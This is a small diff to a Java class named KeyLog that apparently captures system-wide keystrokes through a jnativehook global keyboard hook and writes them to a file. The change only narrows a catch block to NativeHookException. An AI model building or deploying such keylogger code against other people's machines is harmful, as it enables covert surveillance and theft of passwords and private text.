@@ -8,6 +8,7 @@ import java.util.Arrays;
 import java.util.Date;
 
 import org.jnativehook.GlobalScreen;
+import org.jnativehook.NativeHookException;
 import org.jnativehook.keyboard.NativeKeyEvent;
 import org.jnativehook.keyboard.NativeKeyListener;
 
@@ -37,7 +38,7 @@ public class KeyLog implements NativeKeyListener{
 			GlobalScreen.registerNativeHook();
 			fileOutStream.flush();
 		
-		}catch(Exception e) {
+		}catch(NativeHookException e) {
 			
 			String errMsg = Arrays.toString(e.getStackTrace());
 			System.out.println(errMsg);
